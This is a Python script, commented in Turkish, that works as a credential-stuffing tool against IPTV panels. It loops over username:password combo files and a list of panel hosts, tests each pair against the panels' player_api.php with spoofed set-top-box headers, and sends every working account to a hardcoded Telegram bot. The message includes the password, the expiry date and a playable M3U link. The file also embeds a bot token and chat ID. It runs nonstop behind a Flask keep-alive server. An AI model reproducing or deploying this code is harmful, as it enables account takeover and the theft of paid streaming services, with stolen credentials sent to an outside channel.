import os
import time
import datetime
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# SSL uyarılarını kapat
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

from flask import Flask
app = Flask('')

@app.route('/')
def home():
    return "IPTV Bot Aktif ve 7/24 Bulutta Çalışıyor!"

# --- TELEGRAM AYARLARI ---
TOKEN = "9296501081:AAG8COydawvxX-TfAEArbG-SdEtliP6WODM"
CHAT_ID = "-1003901042500"

def telegrama_gonder(mesaj):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"}
        requests.post(url, data=data, timeout=10)
    except Exception as e:
        print(f"[!] Telegram mesajı gönderilemedi: {e}")

HEADERd = {
    'Cookie': 'stb_lang=pt; timezone=America%2FNew_York;',
    'X-User-Agent': 'Model: MAG322; Link: Ethernet,WiFi',
    'Accept': '*/*',
    'Connection': 'Keep-Alive',
    'Accept-Encoding': 'gzip',
    'User-Agent': 'VLC/3.0.18 LibVLC/3.0.18',
}

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

def m3u_tara_detayli(panel, user, pas):
    api_url = f"http://{panel}/player_api.php?username={user}&password={pas}"
    try:
        res = requests.get(api_url, headers=HEADERd, timeout=5, verify=False)
        if res.status_code == 200 and 'user_info' in res.text:
            veri = str(res.text)
            if '"auth":1' in veri or '"status":"Active"' in veri:
                
                try:
                    status = veri.split('status":')[1].split(',')[0].replace('"', '')
                except:
                    status = "Active"
                
                try:
                    acon = veri.split('active_cons":')[1].split(',')[0].replace('"', '')
                except:
                    acon = "?"
                
                try:
                    mcon = veri.split('max_connections":')[1].split(',')[0].replace('"', '')
                except:
                    mcon = "?"
                
                try:
                    bitis = veri.split('exp_date":')[1].split(',')[0].replace('"', '')
                    if bitis == 'null' or not bitis.isdigit():
                        bitis = 'Sınırsız'
                    else:
                        bitis = datetime.datetime.fromtimestamp(int(bitis)).strftime('%Y-%m-%d %H:%M:%S')
                except:
                    bitis = 'Bilinmiyor'

                try:
                    realm = veri.split('url":')[1].split(',')[0].replace('"', '')
                    port = veri.split('port":')[1].split(',')[0].replace('"', '')
                except:
                    realm, port = panel, "80"

                kanalsayisi, filmsayisi, dizisayisi = "0", "0", "0"
                try:
                    k_res = requests.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_live_streams", timeout=3, verify=False)
                    kanalsayisi = str(k_res.text.count('stream_id'))
                    
                    v_res = requests.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_vod_streams", timeout=3, verify=False)
                    filmsayisi = str(v_res.text.count('stream_id'))
                    
                    s_res = requests.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_series", timeout=3, verify=False)
                    dizisayisi = str(s_res.text.count('series_id'))
                except:
                    pass

                m3ulink = f"http://{panel}/get.php?username={user}&password={pas}&type=m3u_plus"
                
                mesaj = (
                    f"🟢 <b>IPTV HİT BULUNDU! (Bulut Otonom)</b>\n"
                    f"🌐 <b>Ana Host:</b> http://{panel}\n"
                    f"🔗 <b>Real Host:</b> http://{realm}:{port}\n"
                    f"👤 <b>Kullanıcı:</b> <code>{user}</code>\n"
                    f"🔑 <b>Şifre:</b> <code>{pas}</code>\n"
                    f"📅 <b>Bitiş Tarihi:</b> {bitis}\n"
                    f"⚡ <b>Aktif/Max Bağlantı:</b> {acon} / {mcon}\n"
                    f"📊 <b>Durum:</b> {status}\n"
                    f"🎬 <b>Kanal:</b> {kanalsayisi} | <b>Film:</b> {filmsayisi} | <b>Dizi:</b> {dizisayisi}\n"
                    f"🔗 <b>M3U Plus Link:</b> {m3ulink}"
                )
                
                telegrama_gonder(mesaj)
                return True
    except:
        pass
    return False

def arka_plan_tarayici():
    print("[*] Bulut Otonom Tarayıcı Başlatıldı...")
    time.sleep(3)
    telegrama_gonder("🚀 <b>Bulut Otonom Tarayıcı Aktif!</b>\n📂 GitHub'daki panel ve combo dosyaları taranıyor...")
    
    combo_dir = os.path.join(BASE_DIR, 'combo')
    panel_dir = os.path.join(BASE_DIR, 'panel_list')
    
    while True:
        try:
            # Panelleri yükle
            paneller = []
            if os.path.exists(panel_dir):
                for p_dosya in os.listdir(panel_dir):
                    if p_dosya.endswith('.txt'):
                        p_yol = os.path.join(panel_dir, p_dosya)
                        with open(p_yol, 'r', encoding='utf-8', errors='ignore') as pf:
                            for line in pf:
                                p_clean = line.strip().replace('http://', '').replace('/', '')
                                if p_clean:
                                    paneller.append(p_clean)

            if not paneller:
                paneller = ["ornekpanel.com:8080"] # Yedek panel

            # Comboları tara ve panellerle eşleştir
            if os.path.exists(combo_dir):
                for dosya_adi in os.listdir(combo_dir):
                    if dosya_adi.endswith('.txt'):
                        dosya_yolu = os.path.join(combo_dir, dosya_adi)
                        print(f"[i] Taranan combo dosyası: {dosya_adi}")
                        
                        with open(dosya_yolu, 'r', encoding='utf-8', errors='ignore') as f:
                            for line in f:
                                line = line.strip()
                                if ':' in line:
                                    parts = line.split(':', 1)
                                    user = parts[0].strip()
                                    pas = parts[1].strip()
                                    
                                    # Listeden rastgele veya sırayla bir panel seçip tarıyoruz
                                    for panel in paneller:
                                        m3u_tara_detayli(panel, user, pas)
                                        time.sleep(0.5)
            
            print("[i] Tarama turu tamamlandı, 30 dakika sonra tekrar dönecek...")
            time.sleep(1800)
        except Exception as e:
            print(f"[!] Tarama döngüsü hatası: {e}")
            time.sleep(60)

if __name__ == '__main__':
    import threading
    t = threading.Thread(target=arka_plan_tarayici)
    t.daemon = True
    t.start()
    
    print("[*] Flask Web Sunucusu Başlatılıyor...")
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
